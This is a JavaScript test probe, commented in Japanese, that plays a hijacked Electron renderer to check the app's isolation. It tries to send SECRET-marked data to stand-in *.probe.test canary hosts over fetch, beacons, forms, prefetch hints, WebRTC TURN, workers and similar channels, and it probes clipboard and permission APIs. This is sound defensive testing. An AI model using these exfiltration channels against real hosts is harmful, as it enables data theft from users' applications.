/**
 * Y-1 の probe: 乗っ取られた renderer が外へ出そうとする試みを、renderer の任意の JS として
 * 実行する（K3/2「renderer の隔離とその固定」3 の (i)〜(vi)）。
 * `renderer-isolation-probe-main.mjs` が `webContents.executeJavaScript` で実行する。
 * 外向きの試みは、すべて `*.probe.test`（canary の 127.0.0.1 へ向く）を使い、host に
 * 試験ごとの marker を含める。通信が網に届いたかは、launcher が net log と canary で判定する。
 * この script 自身は結果（試みた結果の観測）だけを返す。
 *
 * 引数: { port, nonce }（main が先頭に定義する）。戻り値: Promise<Array<{id, ...}>>
 */
(async () => {
  const { port, nonce } = globalThis.__probe;
  const results = [];
  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
  const host = (kind) => `${kind}-${nonce}.probe.test`;
  const url = (kind, path = "/x") =>
    `http://${host(kind)}:${port}${path}?d=SECRET-${kind}`;
  const record = (id, data) => results.push({ id, ...data });
  const settle = async (id, fn, ms = 2500) => {
    const startedAt = Date.now();
    let outcome;
    try {
      outcome = String(
        await Promise.race([fn(), wait(ms).then(() => "timeout")]),
      );
    } catch (error) {
      outcome = `error:${error?.name ?? "Error"}`;
    }
    // 網への到達が遅れて見える場合を含めるため、少し待ってから窓を閉じる。
    await wait(350);
    record(id, { outcome, startedAt, endedAt: Date.now() });
  };

  // ── 対照: 同一 origin の fetch が動く ───────────────────────────────────
  await settle("control.same-origin-fetch", async () => {
    const res = await fetch("/index.html");
    return `status:${res.status}`;
  });

  // ── (iii) fetch、XHR、WebSocket、EventSource、sendBeacon、img、form、navigation、window.open ──
  await settle("net.fetch", async () => (await fetch(url("fetch"))).status);
  await settle(
    "net.fetch-no-cors",
    async () => (await fetch(url("fetchnc"), { mode: "no-cors" })).type,
  );
  await settle(
    "net.xhr",
    () =>
      new Promise((resolve) => {
        const x = new XMLHttpRequest();
        x.onerror = () => resolve("onerror");
        x.onload = () => resolve("onload");
        try {
          x.open("GET", url("xhr"));
          x.send();
        } catch (e) {
          resolve(`throw:${e.name}`);
        }
      }),
  );
  await settle(
    "net.websocket",
    () =>
      new Promise((resolve) => {
        try {
          const ws = new WebSocket(`ws://${host("ws")}:${port}/x?d=SECRET-ws`);
          ws.onerror = () => resolve("onerror");
          ws.onopen = () => resolve("onopen");
          ws.onclose = () => resolve("onclose");
        } catch (e) {
          resolve(`throw:${e.name}`);
        }
      }),
  );
  await settle(
    "net.eventsource",
    () =>
      new Promise((resolve) => {
        try {
          const es = new EventSource(url("es"));
          es.onerror = () => resolve("onerror");
          es.onopen = () => resolve("onopen");
        } catch (e) {
          resolve(`throw:${e.name}`);
        }
      }),
  );
  await settle("net.send-beacon", async () =>
    navigator.sendBeacon(url("beacon"), "SECRET-beacon") ? "queued" : "refused",
  );
  await settle(
    "net.img",
    () =>
      new Promise((resolve) => {
        const img = new Image();
        img.onerror = () => resolve("onerror");
        img.onload = () => resolve("onload");
        img.src = url("img", "/p.png");
      }),
  );
  await settle(
    "net.css-import",
    () =>
      new Promise((resolve) => {
        const link = document.createElement("link");
        link.rel = "stylesheet";
        link.href = url("css", "/s.css");
        link.onerror = () => resolve("onerror");
        link.onload = () => resolve("onload");
        document.head.append(link);
      }),
  );
  await settle(
    "net.script-tag",
    () =>
      new Promise((resolve) => {
        const s = document.createElement("script");
        s.src = url("script", "/s.js");
        s.onerror = () => resolve("onerror");
        s.onload = () => resolve("onload");
        document.head.append(s);
      }),
  );
  await settle(
    "net.iframe-external",
    () =>
      new Promise((resolve) => {
        const f = document.createElement("iframe");
        f.src = url("iframe", "/f.html");
        f.onerror = () => resolve("onerror");
        f.onload = () => resolve("onload");
        document.body.append(f);
        setTimeout(() => resolve("pending"), 1500);
      }),
  );
  await settle(
    "net.media",
    () =>
      new Promise((resolve) => {
        const a = document.createElement("audio");
        a.src = url("media", "/a.mp3");
        a.onerror = () => resolve("onerror");
        a.onloadstart = () => resolve("loadstart");
        a.load();
        setTimeout(() => resolve("pending"), 1500);
      }),
  );
  await settle("net.form-submit", async () => {
    const f = document.createElement("form");
    f.action = url("form", "/post");
    f.method = "POST";
    f.target = "probe-form-target";
    const frame = document.createElement("iframe");
    frame.name = "probe-form-target";
    document.body.append(frame, f);
    const i = document.createElement("input");
    i.name = "d";
    i.value = "SECRET-form";
    f.append(i);
    f.submit();
    await wait(800);
    return "submitted";
  });
  await settle("net.meta-refresh", async () => {
    const m = document.createElement("meta");
    m.httpEquiv = "refresh";
    m.content = `0;url=${url("refresh", "/r")}`;
    document.head.append(m);
    await wait(500);
    return "inserted";
  });
  await settle("net.window-open", async () => {
    const w = window.open(url("open", "/w"));
    return w === null ? "null" : "window";
  });
  await settle("net.a-ping", async () => {
    const a = document.createElement("a");
    a.href = "/index.html#ping";
    a.ping = url("ping", "/p");
    document.body.append(a);
    a.click();
    await wait(300);
    return "clicked";
  });

  // ── (ii) DNS 先読み・preconnect・prefetch・prerender・preload ─────────────
  for (const rel of [
    "dns-prefetch",
    "preconnect",
    "prefetch",
    "prerender",
    "preload",
    "modulepreload",
  ]) {
    await settle(`hint.${rel}`, async () => {
      const link = document.createElement("link");
      link.rel = rel;
      link.href =
        rel === "dns-prefetch" || rel === "preconnect"
          ? `http://${host(rel.replace("-", ""))}:${port}`
          : url(rel.replace("-", ""), "/h.js");
      if (rel === "preload") link.as = "script";
      document.head.append(link);
      await wait(600);
      return "inserted";
    });
  }

  // ── (i) WebRTC ─────────────────────────────────────────────────────────
  for (const [id, servers, extra] of [
    ["webrtc.stun-udp", [{ urls: `stun:${host("stun")}:${port}` }], {}],
    [
      "webrtc.turn-udp",
      [
        {
          urls: `turn:${host("turnudp")}:${port}?transport=udp`,
          username: `SECRET-user-${nonce}`,
          credential: "SECRET-cred",
        },
      ],
      {},
    ],
    [
      "webrtc.turn-tcp",
      [
        {
          urls: `turn:${host("turntcp")}:${port}?transport=tcp`,
          username: `SECRET-user-${nonce}`,
          credential: "SECRET-cred",
        },
      ],
      {},
    ],
    [
      "webrtc.turns-tls",
      [
        {
          urls: `turns:${host("turns")}:${port}`,
          username: `SECRET-user-${nonce}`,
          credential: "SECRET-cred",
        },
      ],
      {},
    ],
    [
      "webrtc.relay-only",
      [
        {
          urls: `turn:${host("relay")}:${port}`,
          username: `SECRET-user-${nonce}`,
          credential: "SECRET-cred",
        },
      ],
      { iceTransportPolicy: "relay" },
    ],
  ]) {
    await settle(
      id,
      async () => {
        if (typeof RTCPeerConnection === "undefined") return "unavailable";
        const pc = new RTCPeerConnection({ iceServers: servers, ...extra });
        pc.createDataChannel("probe");
        const candidates = [];
        pc.onicecandidate = (e) => {
          if (e.candidate) candidates.push(e.candidate.candidate.split(" ")[7]);
        };
        await pc.setLocalDescription(await pc.createOffer());
        await wait(2500);
        const state = pc.iceGatheringState;
        pc.close();
        return `gathering:${state};candidateTypes:${[...new Set(candidates)].join(",")}`;
      },
      6000,
    );
  }

  // ── (iv) CSP のない同一 origin の realm を作る試み ─────────────────────────
  // iframe の contentWindow の関数（その realm の文書の CSP が効く）で外向きの試みをする。
  // eval は使わない（CSP のある realm では eval 自体が禁止されるため、検査から外す）。
  for (const [kind, path] of [
    ["json", "/assets/data.json"],
    ["png", "/assets/pixel.png"],
    ["js", "/assets/app.js"],
    ["md", "/assets/readme.md"],
    ["unknownext", "/assets/data.unknownext"],
    ["notfound", "/assets/nope.js"],
    ["encoded-traversal", "/%2e%2e/secret"],
    ["html", "/index.html"],
  ]) {
    await settle(
      `realm.${kind}`,
      async () => {
        const out = {};
        try {
          const r = await fetch(path);
          out.status = r.status;
          out.cspHeader = r.headers.get("content-security-policy") !== null;
        } catch (e) {
          out.status = "fetch-error";
        }
        const f = document.createElement("iframe");
        f.src = path;
        const loaded = new Promise((r) => {
          f.onload = r;
        });
        document.body.append(f);
        await Promise.race([loaded, wait(1500)]);
        const w = f.contentWindow;
        const t = (name, fn) => {
          try {
            const value = fn();
            if (value && typeof value.catch === "function")
              value.catch(() => {});
            out[name] = "attempted";
          } catch (e) {
            out[name] = `throw:${e.name}`;
          }
        };
        t("fetch", () => w.fetch(url(`rfetch${kind}`)));
        t("beacon", () =>
          w.navigator.sendBeacon(url(`rbeacon${kind}`), "SECRET"),
        );
        t("img", () => {
          new w.Image().src = url(`rimg${kind}`, "/p.png");
        });
        t("ws", () => new w.WebSocket(`ws://${host(`rws${kind}`)}:${port}/x`));
        t("xhr", () => {
          const x = new w.XMLHttpRequest();
          x.open("GET", url(`rxhr${kind}`));
          x.send();
        });
        await wait(700);
        return JSON.stringify(out);
      },
      9000,
    );
    await settle(
      `realm.${kind}.rtc`,
      async () => {
        const f = document.createElement("iframe");
        f.src = path;
        const loaded = new Promise((r) => {
          f.onload = r;
        });
        document.body.append(f);
        await Promise.race([loaded, wait(1500)]);
        const w = f.contentWindow;
        const pc = new w.RTCPeerConnection({
          iceServers: [
            {
              urls: `turn:${host(`rrtc${kind}`)}:${port}?transport=tcp`,
              username: "u",
              credential: "c",
            },
          ],
        });
        pc.createDataChannel("p");
        await pc.setLocalDescription(await pc.createOffer());
        await wait(1500);
        pc.close();
        return "attempted";
      },
      9000,
    );
  }

  // 同梱 script から作る worker（classic と module）。worker の CSP は script の応答で決まる。
  for (const type of ["classic", "module"]) {
    await settle(
      `worker.bundled-${type}`,
      () =>
        new Promise((resolve) => {
          try {
            const w = new Worker(
              type === "classic"
                ? "/assets/probe-worker.js"
                : "/assets/probe-worker-module.js",
              { type },
            );
            w.onmessage = (e) => resolve(JSON.stringify(e.data));
            w.onerror = () => resolve("onerror");
            w.postMessage({ host: host(`worker${type}`), port });
          } catch (e) {
            resolve(`throw:${e.name}`);
          }
        }),
      6000,
    );
  }
  // 同梱の force-layout worker が CSP の下で動く（機能の確認）。
  await settle(
    "worker.force-layout",
    () =>
      new Promise((resolve) => {
        try {
          const w = new Worker("/assets/forceLayout.worker.js", {
            type: "module",
          });
          w.onmessage = (e) => {
            if (e.data?.type === "done") {
              resolve(`done:${e.data.positions.length}`);
              w.terminate();
            }
          };
          w.onerror = () => resolve("onerror");
          w.postMessage({
            type: "run",
            nodes: [{ id: "a" }, { id: "b" }, { id: "c" }],
            links: [{ source: "a", target: "b" }],
            options: { width: 400, height: 300, iterations: 30, randomSeed: 1 },
          });
        } catch (e) {
          resolve(`throw:${e.name}`);
        }
      }),
    8000,
  );
  for (const [id, make] of [
    [
      "worker.blob",
      () =>
        new Worker(
          URL.createObjectURL(
            new Blob([`fetch("http://${host("blobworker")}:${port}/x")`]),
          ),
        ),
    ],
    [
      "worker.data-url",
      () =>
        new Worker(
          `data:text/javascript,fetch("http://${host("dataworker")}:${port}/x")`,
        ),
    ],
    [
      "worker.external",
      () => new Worker(`http://${host("extworker")}:${port}/w.js`),
    ],
  ]) {
    await settle(
      id,
      () =>
        new Promise((resolve) => {
          try {
            const w = make();
            w.onerror = () => resolve("onerror");
            setTimeout(() => resolve("no-error-yet"), 1200);
          } catch (e) {
            resolve(`throw:${e.name}`);
          }
        }),
    );
  }
  await settle("worker.service-worker", async () => {
    if (!("serviceWorker" in navigator)) return "unavailable";
    try {
      await navigator.serviceWorker.register("/assets/probe-worker.js");
      return "registered";
    } catch (e) {
      return `rejected:${e.name}`;
    }
  });

  // ── (v) clipboard と通知（利用者の操作なし）、permission ──────────────────
  await settle("os.clipboard-write", async () => {
    await navigator.clipboard.writeText(`CLIP-${nonce}`);
    return "written";
  });
  await settle("os.notification", async () => {
    const permission = await Notification.requestPermission();
    if (permission === "granted") {
      new Notification(`NOTIFY-${nonce}`, { body: "probe" });
    }
    return `permission:${permission}`;
  });
  for (const name of [
    "geolocation",
    "camera",
    "microphone",
    "clipboard-read",
    "midi",
    "persistent-storage",
    "background-sync",
    "screen-wake-lock",
  ]) {
    await settle(`permission.${name}`, async () => {
      const status = await navigator.permissions.query({ name });
      return status.state;
    });
  }
  await settle("permission.get-user-media", async () => {
    await navigator.mediaDevices.getUserMedia({ audio: true });
    return "granted";
  });
  await settle(
    "permission.geolocation-request",
    () =>
      new Promise((resolve) =>
        navigator.geolocation.getCurrentPosition(
          () => resolve("position"),
          (e) => resolve(`denied:${e.code}`),
        ),
      ),
  );

  // ── 利用者の操作なしに OS へ値を渡す表示 ─────────────────────────────────
  await settle("os.media-session", async () => {
    if (!("mediaSession" in navigator)) return "unavailable";
    navigator.mediaSession.metadata = new MediaMetadata({
      title: `MEDIA-${nonce}`,
    });
    return "metadata-set";
  });
  await settle("os.app-badge", async () => {
    if (!("setAppBadge" in navigator)) return "unavailable";
    await navigator.setAppBadge(7);
    return "badge-set";
  });
  await settle("os.share", async () =>
    "share" in navigator ? "present" : "unavailable",
  );
  // ── File System Access API ─────────────────────────────────────────────
  for (const name of [
    "showSaveFilePicker",
    "showOpenFilePicker",
    "showDirectoryPicker",
  ]) {
    await settle(`fsa.${name}`, async () => {
      if (typeof window[name] !== "function") return "unavailable";
      return "present";
    });
  }

  // ── (vi) 窓の title ─────────────────────────────────────────────────────
  document.title = `TITLE-${nonce}`;
  await wait(300);
  record("title.document-title-set", { outcome: document.title });

  return results;
})();
